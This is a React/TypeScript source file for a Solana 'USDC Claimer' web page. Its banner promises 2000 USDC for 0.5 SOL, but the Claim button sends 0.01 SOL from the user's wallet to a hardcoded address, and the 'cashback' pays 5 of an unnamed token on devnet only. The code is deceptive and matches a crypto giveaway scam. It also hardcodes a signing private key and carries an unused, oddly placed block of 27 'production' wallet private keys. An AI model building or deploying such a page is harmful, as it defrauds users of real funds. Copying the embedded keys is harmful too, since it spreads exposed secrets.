/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5kitTpeueydC7bKYNAhHCFY23LS4q9VLzP8xSaEJ4XTMe5Y1hT72CRgWbnqbo7ZAe7CNLuoThQpzpeZkpb2xawQs"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3DPkL7k1XAJbrQVqid5phpqCRtunp4XRy6GEDbWvSRmYY6JArijRSZ2t2x2VytYzd9A65LdbNYv74UGN6BcdUFQE",
  "key1": "2kBH8JbufJbV1XvEx5mVVvCaje4ZJKikLBLMwtXUgUwxTDTtm8HA6q6CcydtQCE35DoKtw6Mee96hBHBXxH4ZRHZ",
  "key2": "4hQdJ6kUzf2CPHS4WBgY6kXH552GdjL97AoN7Xch5k1tdAJoNiARz6V5bQkZo9PqeAk3iMwu323AhyG5EtvBJCeY",
  "key3": "npBZoxU4NLYAKMtjnATJ78qFVdtLsbXSAwt3aiPBbFDtENo2UTZNMH6GGssQwFLtzQ2tsGiXf8NsDrcr9i5rEev",
  "key4": "5j34PzX1HNjREQMTpkHz2ui4zarbqfyiLyo6KZGKychSZSURNw4SnK5Uvoma33Foy6AddwSLaHPbBbEMxNVr6kVA",
  "key5": "55gte4zZHiswGLfAXCALTnXFVnq1gXCR8MHLxbYtR9Quj4YnNfBjB7hC86LHuN4VjU2fMSueHyriPMPpFhuuqT53",
  "key6": "3bSesjmEcJvx7r9ncQaAZJuFc3fVSeuqv6GrWjAjeLMRfSNV1bgahf1ZwCHzPTt82Pz5hq5eWL7iLDXnJEHvpBvC",
  "key7": "4oKFtiASy9oFpshFHsMrUJ7nrWudF2HgbrbN3ad7BZb2YHRnF7WwHXuq79erdYiU1trtPHyRffZfhhv1eKTZC2NB",
  "key8": "55cXQXJue51XqeZRtd1V5qGnLrRQ5EXAYg3roqP5D5fPJaW2HBbisddPuHbcDJ1ihEH9uPs3A3RRZUXTDWcg77YF",
  "key9": "5yYvK676Z4C2DhKri5dhCfwKU99Y596m1nJ2dACX97eUwkzzA9v55M6XsxV23MizzmdqDxY8e5p8ks2xmHjkJLCx",
  "key10": "3ZxM8yjrSjPsdSUhAZnmwHDrXknef6rXCqw3YwL1diFAMpDoW52uPpe1o3LMFUEynShGxKqkCZy8n21kRhHW1rtq",
  "key11": "4X6JHYPGzZs2VgCvhpF3e3RkRgdD4yv5tD6AVUvuUiUXiHq3vgUk5nuk25dEVapSHJWws4JAMZgGtDbyVWKZwhiy",
  "key12": "3dKKgGdLdgcNG5iyKLXz7HxBtLjSXvNB9EMGKjyPMLYmfHRQQNNhZhn2b1L826EXyqLttJx6BmzNswSxRtg2K1SE",
  "key13": "2ehZ8MYkHb3FgzRHkyYXYKDe1J7s5EZjzJughy8AebUzsgMxKkNYQzmwsyxfebUQazeKUf1nLeKSJqYy8NwWzPtY",
  "key14": "59NGg3SCvHMFW9D972jbA98T9zkUUd9p1PhLhqo2HEhU8eBCWD442vZ1bKVCnzbeWrJroBjyWMnyygESgUBRLtjt",
  "key15": "4WDCrTTnkcKcmyJMrGErhdabgTp4NM3KLvsmNbkYVfxnWWRc8kb3irt91AJLJNBe6s9TDKFs3YcEzaLvABYTqwSu",
  "key16": "3yJ7dTaBby4jrKaE69efkRnxg6rcXi3sZFpgP9JWF12Vowa9FQHWSt2ryZ68qgoEpk3SKtWNtrqCrG99j2E4nuwD",
  "key17": "2EWDj6cbqNATycnUdHVTT84YxRDdMXa7sz9Vm8fdJpQozS8TD1yVCRay8aLqLCD1CpJz6Ysahnm7LRATEmp4ncsv",
  "key18": "uRfJG4UtB49UNFoF7oGShR5kJYKQwigVndACwGFUZzjriydRaBwy6r3sagWfVu4wSVdbaNdN4MhxdNKzmvLLpVZ",
  "key19": "3e9CJUkBn2wX96rThRxQeicPT4ckg8yaYgpfJakBocHwdMX1kYsYCDuYBi1gxSpLTi3M767TU1sM8Rz1PMrHQ73u",
  "key20": "EWYNDysFgvVPjskEKZvbeGTaoYDZbY3wNi5JEHwTG271zyDwqdkB6j4Rgkr6iAfRTR8JbbRoTKr8kp51aNqDDny",
  "key21": "2VMStg2o6eTvUwSf1BQ97w5XWTpRuRSCLnY9mfxm7d7dq2cX9LdfU3Ef9MCYrGGntThdrrSFbsKYqhfvCE5u2ZAy",
  "key22": "5C7nPQXHG4E58mB4qKSbxELrTfeckzQQzE2YSF9xTHGL5NZe6xYwDo2a6GZ8k1Z6YzADRdkABDku7V5iYM8g31Hj",
  "key23": "2WA1fiAtMrieDdp6YhBjUBREKyS5aeePQp51mAFiizwq7K3atXcw4bRSHkR8qW5oa1khQAK7o5AoXwyKPtz7NT8W",
  "key24": "4Y5ruLNs6JgVxLdktatAZJuB6xFvYTigqYiw6a5Lm7E1Y4KjJFSKdfdaWP6pcxgadNHGRuETjw1b23NxXwXPx6Ze",
  "key25": "5V3GWGyc7nvdrsifeq54RVSBLqF2TgySBcCmdth2LhdHw2C8NHs6w2HmyPnT5ptemGH4UQ4mQg83GMMtFq7dWJjK",
  "key26": "5Dmov63Hj3TzCnXmBQuAfbVKgyou1SJ9pDEWdyFDjP29HVWEGf9r3ULZ89BYLJPrFpia3xJgzZEoJoSr7EBqxf3z"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
